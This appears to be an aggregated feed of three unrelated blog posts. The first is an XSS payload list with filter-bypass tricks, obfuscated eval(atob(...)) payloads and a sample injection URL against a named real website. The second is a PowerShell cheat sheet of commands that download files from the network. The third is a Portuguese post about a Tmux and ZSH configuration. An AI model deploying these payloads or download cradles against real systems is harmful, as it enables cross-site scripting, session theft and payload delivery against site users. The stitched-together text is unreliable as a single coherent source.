item.title: XSS Payload List
item.description:
Assume, the server filter ) and you want to bypass it then use:

<svg/onload="-alert(1)/**/">

还可以在alert前面添加+、%0A、%0B、%0C、%0D来进行绕过。
如果是反射型XSS，可以使用上述字符进行测试，如果是存储型XSS，使用-、+、来进行绕过。
在html中并不是所有标签都需要闭合的，如<svg onload=alert(1)也是可以使用的。
+号可以插入多个。

"-alert`1`,"

E.g

window.location.replace("http://site.com?x=3site.com/?x=3 "); 
window.location.replace("http://site.com?x=3site.com/?x=3 "-alert`1`,")

will do the trick.

<b"/onauxclick='-alert(1);'>Copy Me

XXS The payload will run in all the context. Eg - 

<input type="text" value="<b"/onauxclick='-alert(2);'>XXS">

<script> var test='<b"/onauxclick='-alert(3);'>TEST'; </script>

<d3"👉😎👈/onclick="1>[confirm`xss`]"<"😎>

E.g

http://dramaonline.pk/search.php?q=</title><d3"👉😎👈/onclick="1>[confirm`xss`]"<"😎>

xmp

<xmp><p title="</xmp><svg/onload=alert(45)>”>

noscript

<noscript><p title="</noscript><svg/onload=alert(45)>”>

noframes

<noframes><p title="</noframes><svg/onload=alert(45)>”>

iframe

<iframe><p title="</iframe><svg/onload=alert(45)>">

<--`<img/src=` onerror=confirm`xss`> --!> 

<--<img onerror=alert(1) src=a> --!>
<--%253cimg%20onerror=alert(1)%20src=a%253e --!>

Data URI scheme

data:
data:text/plain
data:text/html
data:text/html;base64
data:text/css
data:text/css;base64
data:text/javascript
data:text/javascript;base64
data:image/gif;base64
data:image/png;base64
data:image/jpeg;base64
data:image/x-icon;base64

working IE/EDGE XSS payload

"><script>co\u006efir\u006d`1`</script>

<svg onload=1?alert(9):0>
<svg onload=0?1:alert(9)>

AutoFocus后面的*/;会被解析为*属性、;属性。所以这里还可以加上任意字符a/b/c/、confirm也可以使用\u进行编码。

hello<!'/*!"/*!\'/*\"/*--!><Input/Type=Text AutoFocus */; OnFocus=(confirm)(document.domain) //><Svg>#

<iframe src=jaVaScrIpT:eval(atob('Y29uZmlybShkb2N1bWVudC5kb21haW4pOw=='))>
<sVg/oNloAd="JaVaScRiPt:/**/eval(atob('Y29uZmlybShkb2N1bWVudC5kb21haW4pOw=='))">
<sVG/ aa */(/ oNloAd="JaVaScRiPt:/**/eval(atob('Y29uZmlybShkb2N1bWVudC5kb21haW4pOw=='))">
<sVG/ aa */(/ oNloAd="JaVaScRiPt:/**/eval(atob('Y29uZ mly bShkb2N1b WVudC5 kb21haW4 pOw = = '))">

<a href="javascript:"/*'/*`/*--><html \" onmouseover=/*<svg/*/onload=alert(/xss/)//>
<a href="javascript://comment%0a%0dalert(/xss/);"> Click Me</a>

item.title: Windows Powershell Download File
item.description:
下载：

1. Net.WebClient

powershell.exe -Command "& {(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/3ecurity/3ecurity.github.io/master/test.jpg', 'test1.jpg')}"

2. BitsTransfer

powershell.exe -Command "& {Import-Module BitsTransfer; Start-BitsTransfer 'https://raw.githubusercontent.com/3ecurity/3ecurity.github.io/master/test.jpg' 'test2.jpg'}"

3. Invoke-WebRequest (was added in PowerShell 3.0)

powershell.exe -Command "& {Invoke-WebRequest 'https://raw.githubusercontent.com/3ecurity/3ecurity.github.io/master/test.jpg' -OutFile 'test3.jpg'}"

4. iwr (alias for Invoke-WebRequest since PowerShell 3.0)

powershell.exe -Command “& {(iwr https://raw.githubusercontent.com/3ecurity/3ecurity.github.io/master/test.jpg).Content > test4.jpg}” 由于之前的命令是有问题的，经过google，正确用法如下：

powershell -command "& { iwr https://raw.githubusercontent.com/3ecurity/3ecurity.github.io/master/test.jpg -OutFile test4.jpg }"

5. wget, curl (aliases for Invoke-WebRequest since PowerShell 4.0)

powershell.exe -Command "& {wget 'https://raw.githubusercontent.com/3ecurity/3ecurity.github.io/master/test.jpg' -OutFile 'test5.jpg'}"

powershell.exe -Command "& {curl 'https://raw.githubusercontent.com/3ecurity/3ecurity.github.io/master/test.jpg' -OutFile 'test6.jpg'}"

item.title: Arch Linux + Tmux = CLI++
item.description:
Caso queira ver o print maior, clica aqui [0].

Primeiro post do blog em 2017, logo no primeiro dia do ano, será que isso quer dizer alguma coisa? haha

Enfim, temos aqui um screenshot, algo que já queria postar há um tempo, mas enfim, está aqui agora. Nele tem aberto o filme “Lights Out” no Mplayer (\o/) e por trás o Tmux, com ZSH.

O Tmux é quase o padrão. No arquivo de configuração tem apenas o seguinte:

bind c new-window -c '#{pane_current_path}'
bind '"' split-window -c '#{pane_current_path}'
bind % split-window -h -c '#{pane_current_path}'

Contribuição do Marino, que serve para quando abrirmos um novo painel no Tmux, ele persistir o diretório do painel atual.

Já no ZSH eu utilizo o Oh-My-ZSH [1] com um tema bem simples que montei:

setopt promptsubst
PROMPT=$'%B${(r:$COLUMNS::¨:)}$(git_prompt_info)%{$fg[white]%}>> %b%{$reset_color%}'
RPROMPT='%B%*%b'

ZSH_THEME_GIT_PROMPT_PREFIX="%{$fg[white]%}"
ZSH_THEME_GIT_PROMPT_SUFFIX="%{$reset_color%} "
ZSH_THEME_GIT_PROMPT_DIRTY="%{$fg[red]%} *%{$reset_color%}"
ZSH_THEME_GIT_PROMPT_CLEAN=""

E lá ao fundo o wallpaper de gatênho! Aqui o link para ele: Gatênho [2].

Bom, tomara que começar o ano postando algo assim faça vir mais posts e coisas boas por aqui. Até a próxima, pessoal! o/

Links

[0]: http://localhost:4000/images/posts/2017/01.png
[1]: http://ohmyz.sh/
[2]: http://localhost:4000/images/posts/2017/02.jpg
